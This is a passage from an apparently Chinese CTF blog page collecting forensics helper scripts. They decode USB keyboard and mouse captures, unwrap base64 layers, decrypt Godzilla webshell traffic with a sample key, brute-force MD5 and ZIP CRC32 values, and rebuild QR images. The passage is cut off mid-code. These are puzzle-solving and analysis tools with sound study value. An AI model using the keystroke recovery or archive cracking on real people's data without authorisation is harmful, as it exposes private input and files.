class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;nums = []keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)<span class="keyword">for</span> line <span class="keyword">in</span> keys:    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:         <span class="keyword">continue</span>    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))keys.close()output = <span class="string">""</span><span class="keyword">for</span> n <span class="keyword">in</span> nums:    <span class="keyword">if</span> n == <span class="number">0</span> :        <span class="keyword">continue</span>    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:        output += mappings[n]    <span class="keyword">else</span>:        output += <span class="string">&#x27;[unknown]&#x27;</span><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</code></pre><p>keyboard2.py</p><pre class=" language-highlight python"><code class="language-highlight python">normalKeys = &#123;    <span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>,    <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>,     <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>,      <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>,       <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>,        <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>,         <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,         <span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"<RET>"</span>,<span class="string">"29"</span>:<span class="string">"<ESC>"</span>,<span class="string">"2a"</span>:<span class="string">"<DEL>"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,         <span class="string">"2c"</span>:<span class="string">"<SPACE>"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,         <span class="string">"32"</span>:<span class="string">"<NON>"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"&#x27;"</span>,<span class="string">"35"</span>:<span class="string">"<GA>"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,         <span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"<CAP>"</span>,<span class="string">"3a"</span>:<span class="string">"<F1>"</span>,<span class="string">"3b"</span>:<span class="string">"<F2>"</span>, <span class="string">"3c"</span>:<span class="string">"<F3>"</span>,<span class="string">"3d"</span>:<span class="string">"<F4>"</span>,         <span class="string">"3e"</span>:<span class="string">"<F5>"</span>,<span class="string">"3f"</span>:<span class="string">"<F6>"</span>,<span class="string">"40"</span>:<span class="string">"<F7>"</span>,<span class="string">"41"</span>:<span class="string">"<F8>"</span>,<span class="string">"42"</span>:<span class="string">"<F9>"</span>,<span class="string">"43"</span>:<span class="string">"<F10>"</span>,         <span class="string">"44"</span>:<span class="string">"<F11>"</span>,<span class="string">"45"</span>:<span class="string">"<F12>"</span>&#125;shiftKeys = &#123;    <span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>,     <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>,      <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>,       <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>,        <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>,         <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>,          <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,          <span class="string">"28"</span>:<span class="string">"<RET>"</span>,<span class="string">"29"</span>:<span class="string">"<ESC>"</span>,<span class="string">"2a"</span>:<span class="string">"<DEL>"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"<SPACE>"</span>,          <span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"<NON>"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,          <span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"<GA>"</span>,<span class="string">"36"</span>:<span class="string">"<"</span>,<span class="string">"37"</span>:<span class="string">">"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"<CAP>"</span>,<span class="string">"3a"</span>:<span class="string">"<F1>"</span>,          <span class="string">"3b"</span>:<span class="string">"<F2>"</span>, <span class="string">"3c"</span>:<span class="string">"<F3>"</span>,<span class="string">"3d"</span>:<span class="string">"<F4>"</span>,<span class="string">"3e"</span>:<span class="string">"<F5>"</span>,<span class="string">"3f"</span>:<span class="string">"<F6>"</span>,<span class="string">"40"</span>:<span class="string">"<F7>"</span>,          <span class="string">"41"</span>:<span class="string">"<F8>"</span>,<span class="string">"42"</span>:<span class="string">"<F9>"</span>,<span class="string">"43"</span>:<span class="string">"<F10>"</span>,<span class="string">"44"</span>:<span class="string">"<F11>"</span>,<span class="string">"45"</span>:<span class="string">"<F12>"</span>&#125;output = []keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)<span class="keyword">for</span> line <span class="keyword">in</span> keys:    <span class="keyword">try</span>:        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:             <span class="keyword">continue</span>        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]        <span class="keyword">else</span>:            output += [<span class="string">&#x27;[unknown]&#x27;</span>]    <span class="keyword">except</span>:        <span class="keyword">pass</span>keys.close()flag=<span class="number">0</span><span class="built_in">print</span>(<span class="string">""</span>.join(output))<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):    <span class="keyword">try</span>:        a=output.index(<span class="string">&#x27;<DEL>&#x27;</span>)        <span class="keyword">del</span> output[a]        <span class="keyword">del</span> output[a-<span class="number">1</span>]    <span class="keyword">except</span>:        <span class="keyword">pass</span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):    <span class="keyword">try</span>:        <span class="keyword">if</span> output[i]==<span class="string">"<CAP>"</span>:            flag+=<span class="number">1</span>            output.pop(i)            <span class="keyword">if</span> flag==<span class="number">2</span>:                flag=<span class="number">0</span>        <span class="keyword">if</span> flag!=<span class="number">0</span>:            output[i]=output[i].upper()    <span class="keyword">except</span>:        <span class="keyword">pass</span><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">""</span>.join(output))</code></pre><h4 id="5-提取base64和十六进制"><a href="#5-提取base64和十六进制" class="headerlink" title="5.提取base64和十六进制"></a>5.提取base64和十六进制</h4><pre class=" language-highlight sql">import pandas <span class="keyword"><code class="language-highlight sql">import pandas <span class="keyword">as</span> pd  #  读取  Excel  ⽂件     df <span class="operator">=</span> pd.read_excel("3.xlsx")      #  提取  base64  和  <span class="number">16</span> 进制   列的数据     base64_data <span class="operator">=</span> df[<span class="string">&#x27;base64&#x27;</span>].dropna()  #  提取  base64  列并去除空值     hex_data <span class="operator">=</span> df[<span class="string">&#x27;16 进制 &#x27;</span>].dropna()  #  提取  <span class="number">16</span> 进制   列并去除空值       #  将  base64  列保存为  base64.txt    <span class="keyword">with</span> <span class="keyword">open</span>("base64.txt", "w") <span class="keyword">as</span> file:         file.write("".<span class="keyword">join</span>(base64_data))           #  将  <span class="number">16</span> 进制   列保存为  hex_16.txt  <span class="number">15</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>    <span class="keyword">with</span> <span class="keyword">open</span>("hex_16.txt", "w") <span class="keyword">as</span> file:         file.write("".<span class="keyword">join</span>(hex_data))          print(" 数据已成功提取并保存为  base64.txt  和  hex_16.txt ！ "</code></pre><h4 id="6-base64循环解码"><a href="#6-base64循环解码" class="headerlink" title="6.base64循环解码"></a>6.base64循环解码</h4><pre class=" language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> base64<span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">content</span>):    <span class="keyword">try</span>:        <span class="comment"># 尝试进行Base64解码</span>        <span class="keyword">return</span> base64.b64decode(content).decode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:        <span class="comment"># 如果解码失败，返回原内容</span>        <span class="built_in">print</span>(<span class="string">f"解码失败: <span class="subst">&#123;e&#125;</span>"</span>)        <span class="keyword">return</span> <span class="literal">None</span><span class="keyword">def</span> <span class="title function_">loop_base64_decode</span>(<span class="params">file_path</span>):    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:        content = file.read().strip()  <span class="comment"># 读取文件并去除空格和换行符</span>    <span class="comment"># 循环进行Base64解码，直到得到一个正常的文本</span>    <span class="keyword">while</span> <span class="literal">True</span>:        decoded_content = decode_base64(content)        <span class="keyword">if</span> decoded_content <span class="keyword">is</span> <span class="literal">None</span>:            <span class="built_in">print</span>(<span class="string">"解码结束，得到最终内容:"</span>)            <span class="built_in">print</span>(content)            <span class="keyword">break</span>        <span class="keyword">else</span>:            content = decoded_content            <span class="built_in">print</span>(<span class="string">"继续解码...当前内容为:"</span>)            <span class="built_in">print</span>(content)            <span class="comment"># 假设一旦获得最终结果，不再继续解码</span>            <span class="keyword">if</span> <span class="string">"&#123;"</span> <span class="keyword">in</span> content <span class="keyword">or</span> <span class="string">"&#125;"</span> <span class="keyword">in</span> content:  <span class="comment"># 可以根据实际内容设定停止条件</span>                <span class="built_in">print</span>(<span class="string">"解码结束，得到最终内容:"</span>)                <span class="built_in">print</span>(content)                <span class="keyword">break</span><span class="comment"># 示例调用</span>loop_base64_decode(<span class="string">&#x27;base64.txt&#x27;</span>)</code></pre><h4 id="7-哥斯拉解密"><a href="#7-哥斯拉解密" class="headerlink" title="7.哥斯拉解密"></a>7.哥斯拉解密</h4><pre class=" language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> base64<span class="keyword">import</span> gzip<span class="keyword">import</span> re<span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote<span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">s</span>):    <span class="keyword">return</span> s[:-<span class="built_in">ord</span>(s[<span class="built_in">len</span>(s) - <span class="number">1</span>:])]<span class="keyword">def</span> <span class="title function_">XOR</span>(<span class="params">D, K</span>):    result = []    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(D)):         c = K[i + <span class="number">1</span> & <span class="number">15</span>]         <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(D[i], <span class="built_in">int</span>):             d = <span class="built_in">ord</span>(D[i])         <span class="keyword">else</span>:              d = D[i]         result.append(d ^ <span class="built_in">ord</span>(c))    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join([i.to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> result])<span class="keyword">class</span> <span class="title class_">PHP_XOR_BASE64</span>:    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, pass_, key</span>):        <span class="variable language_">self</span>.pass_ = pass_        <span class="variable language_">self</span>.key = key    <span class="keyword">def</span> <span class="title function_">decrypt_req_payload</span>(<span class="params">self, payload</span>):        payload = payload.decode().split(<span class="variable language_">self</span>.pass_ + <span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]        <span class="keyword">return</span> gzip.decompress(XOR(base64.b64decode(unquote(payload)),<span class="variable language_">self</span>.key))    <span class="keyword">def</span> <span class="title function_">decrypt_res_payload</span>(<span class="params">self, payload</span>):        payload = payload[<span class="number">16</span>:-<span class="number">16</span>]        <span class="keyword">return</span> gzip.decompress(XOR(base64.b64decode(payload.decode()),<span class="variable language_">self</span>.key))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:    decrypter = PHP_XOR_BASE64(pass_=<span class="string">&#x27;Kun123456&#x27;</span>, key=<span class="string">&#x27;89e1841adb6aa1d5&#x27;</span>)<span class="comment">#这⾥放⼊经过url解码后请求包数据</span>data =decrypter.decrypt_res_payload(<span class="string">b&#x27;eb7b10f2f199d2fbJu45ODQxYWRiPJLpxW9ANkjOH/H8He9jwLSFpbPYwcD92dPK4BOkPmLqVnuOezU4OQ == 6943d76348685deb&#x27;</span>)<span class="built_in">print</span>(data)</code></pre><h4 id="8-鼠标流量"><a href="#8-鼠标流量" class="headerlink" title="8.鼠标流量"></a>8.鼠标流量</h4><p>使用mouse.py测试信息隐藏位置</p><pre class=" language-highlight python"><code class="language-highlight python">nums = []keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)posx = <span class="number">0</span>posy = <span class="number">0</span><span class="keyword">for</span> line <span class="keyword">in</span> keys:    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :        <span class="keyword">continue</span>    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)    <span class="keyword">if</span> x > <span class="number">127</span> :        x -= <span class="number">256</span>    <span class="keyword">if</span> y > <span class="number">127</span> :        y -= <span class="number">256</span>    posx += x    posy += y    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span>    <span class="keyword">if</span> btn_flag == <span class="number">2</span> : <span class="comment"># 1 代表左键</span>        f.write(<span class="built_in">str</span>(posx))        f.write(<span class="string">&#x27; &#x27;</span>)        f.write(<span class="built_in">str</span>(posy))        f.write(<span class="string">&#x27;\n&#x27;</span>)f.close()</code></pre><p>用gnuplot将<code>xy.txt</code>里的坐标转化成图像</p><pre class=" language-highlight python"><code class="language-highlight python">gnuplotgnuplot>plot <span class="string">"xy.txt"</span></code></pre><h4 id="9-匹配md5b的末尾为特殊值（eg-8b184b）"><a href="#9-匹配md5b的末尾为特殊值（eg-8b184b）" class="headerlink" title="9.匹配md5b的末尾为特殊值（eg:8b184b）"></a>9.匹配md5b的末尾为特殊值（eg:8b184b）</h4><pre class=" language-highlight bash"><code class="language-highlight bash"><?php<span class="keyword">for</span>(<span class="variable">$b</span>=1;<span class="variable">$b</span><=100000;<span class="variable">$b</span>++)&#123; //b从1到100000   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^8b184b/&#x27;</span>,substr(md5(<span class="variable">$b</span>),-6,6)))&#123; //匹配md5b的末尾为8b184b      <span class="built_in">echo</span> <span class="variable">$b</span>; //输出b      <span class="built_in">echo</span> <span class="string">"\n"</span>;      <span class="built_in">echo</span> md5(<span class="variable">$b</span>); //输出md5      <span class="built_in">echo</span> <span class="string">"\n"</span>;   &#125;&#125;?></code></pre><h4 id="10-十进制转十六进制"><a href="#10-十进制转十六进制" class="headerlink" title="10.十进制转十六进制"></a>10.十进制转十六进制</h4><pre class=" language-highlight python"><span class="keyword">def</span> <span class="title function_">dec_to_hex</span>(<span class="params"><code class="language-highlight python"><span class="keyword">def</span> <span class="title function_">dec_to_hex</span>(<span class="params">number</span>):    <span class="comment"># 使用内置函数hex进行转换，但hex会返回以&#x27;0x&#x27;开头的字符串</span>    <span class="comment"># 使用切片操作去除&#x27;0x&#x27;</span>    hex_str = <span class="built_in">hex</span>(number)[<span class="number">2</span>:]    <span class="comment"># 如果转换后的字符串长度是1（即小于16），为了符合常规表示习惯，我们在前面添加一个&#x27;0&#x27;</span>    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) == <span class="number">1</span>:        hex_str = <span class="string">&#x27;0&#x27;</span> + hex_str    <span class="keyword">return</span> hex_str  <span class="comment"># 示例</span><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:    <span class="comment"># 从用户获取输入</span>    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">"请输入一个非负整数: "</span>))    <span class="comment"># 转换并输出结果</span>    hex_representation = dec_to_hex(number)    <span class="built_in">print</span>(<span class="string">f"<span class="subst">&#123;number&#125;</span>的16进制表示为: <span class="subst">&#123;hex_representation&#125;</span>"</span>)</code></pre><h4 id="11-异或"><a href="#11-异或" class="headerlink" title="11.异或"></a>11.异或</h4><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment"># 定义加密后的密文和密钥的十六进制字符串  </span>txt = <span class="string">"4e94dcdb6de87e65d263419ec45aec93e8a2e1d386b31fb804e0f02366df44dbe86a8a7c462d"</span>key = <span class="string">"28f8bdbc16de4850e05579acf33c8aa08ac3d9e6e3822b8c3081c04700eb25b88a08eb457550"</span> <span class="comment"># 将十六进制字符串转换为字节对象</span>ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(txt)key_bytes = <span class="built_in">bytes</span>.fromhex(key) <span class="comment"># 使用逐字节异或进行解密</span><span class="comment"># 注意：这里假设密钥和密文长度相同，否则zip会截断到较短的长度</span>decrypted_bytes = <span class="built_in">bytes</span>([c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext_bytes, key_bytes)]) <span class="comment"># 尝试将解密后的字节对象解码为字符串，忽略无法解码的字节</span><span class="comment"># 这里假设解密后的字节能够大部分解码为有效的UTF-8字符</span><span class="built_in">print</span>(decrypted_bytes.decode(errors=<span class="string">"ignore"</span>)) <span class="comment"># 打印解密后的字符串（这行代码其实和上面的print是重复的，但保留以展示意图）</span><span class="comment"># print(decrypted_bytes.decode(errors="ignore"))</span></code></pre><h4 id="12-日志中提取十六进制"><a href="#12-日志中提取十六进制" class="headerlink" title="12.日志中提取十六进制"></a>12.日志中提取十六进制</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import re   # 读取数据with open(&#x27;2.txt&#x27;,&#x27;r&#x27;) as file:      lines = file.readlines()output_str = &#x27;&#x27;#存储最终字符串# 遍历数据for i in range(1, len(lines)):      current_line = lines[i]      previous_line = lines[i-1]      #过滤数据      if re.search(r&#x27;from_user\)="2B&#x27;,current_line):      # 使用正则表达式提取内容         match = re.search(r&#x27;from_user\)="(.*)"&#x27;, previous_line)         if match:             output_str += match.group(1) + &#x27; &#x27;# 输出结果print(output_str)</code></pre><h4 id="13-二维码碎片拼接"><a href="#13-二维码碎片拼接" class="headerlink" title="13.二维码碎片拼接"></a>13.二维码碎片拼接</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">from PIL import Imageimport osimport globdef merge_images(image_folder, output_file, rows=10, cols=10):    # 获取所有图片文件并按文件名排序    image_files = sorted(glob.glob(os.path.join(image_folder, &#x27;*.*&#x27;)),                         key=lambda x: os.path.basename(x).split(&#x27;.&#x27;)[0])    # 确保图片数量正确    assert len(image_files) == rows * cols, f"需要&#123;rows * cols&#125;张图片，当前找到&#123;len(image_files)&#125;张"    # 打开第一张图片获取尺寸    with Image.open(image_files[0]) as img:        img_width, img_height = img.size    # 创建新画布    canvas = Image.new(&#x27;RGB&#x27;, (cols * img_width, rows * img_height))    # 逐个粘贴图片    for index, image_path in enumerate(image_files):        row = index // cols  # 计算行位置        col = index % cols  # 计算列位置        with Image.open(image_path) as img:            # 确保图片尺寸一致（可选：img = img.resize((img_width, img_height))）            if img.size != (img_width, img_height):                raise ValueError(f"图片&#123;os.path.basename(image_path)&#125;尺寸不一致")            # 计算粘贴位置            position = (col * img_width, row * img_height)            canvas.paste(img, position)    # 保存结果    canvas.save(output_file)    print(f"拼接完成！结果已保存至：&#123;output_file&#125;")if __name__ == &#x27;__main__&#x27;:    # 使用示例    merge_images(        image_folder=r&#x27;F:\桌面\temprory\lalala\flaggg-修复\flag\tiles&#x27;,  # 图片存放目录        output_file=&#x27;./merged_image.jpg&#x27;,  # 输出文件名        rows=10,        cols=10    )</code></pre><h4 id="14-CRC32"><a href="#14-CRC32" class="headerlink" title="14.CRC32"></a>14.CRC32</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import zipfileimport binasciiimport stringdef FileRead(zipname):    try:        f = open(zipname)         #打开⽬标⽂件        f.close()    except FileNotFoundError:        print("未找到同⽬录下的压缩包⽂件" + zipname) #如果未找到⽂件，输出错误        return                         #退出线程，进⾏详细报错    except PermissionError:        print("⽆法读取⽬标压缩包（⽆权限访问）")       #如果发现目标文件无权限，输出错误        return                                 #退出线程，进行详细报错def FourByte(zipname):    zip_url = "./" + zipname    file_zip = zipfile.ZipFile(zip_url)  #⽤zipfile读取指定的压缩包⽂件    name_list = file_zip.namelist()  #使⽤⼀个列表，获取并存储压缩包内所有的⽂件名    crc_list = []    crc32_list = []    print(&#x27;+--------------遍历指定压缩包的CRC值 - ---------------+&#x27;)    for name in name_list:        name_message = file_zip.getinfo(name)        crc_list.append(name_message.CRC)        crc32_list.append(hex(name_message.CRC))        print(&#x27;[OK] &#123;0&#125;: &#123;1&#125;&#x27;.format(name, hex(name_message.CRC)))    print(&#x27;+------------对输出的CRC值进⾏碰撞 - ----------------+&#x27;)    comment = &#x27;&#x27;    chars = string.printable    for crc_value in crc_list:        for char1 in chars:            for char2 in chars:                for char3 in chars:                    for char4 in chars:                        res_char = char1 + char2 + char3 + char4  #获取任意4Byte字符                        thicken_crc = binascii.crc32(res_char.encode())  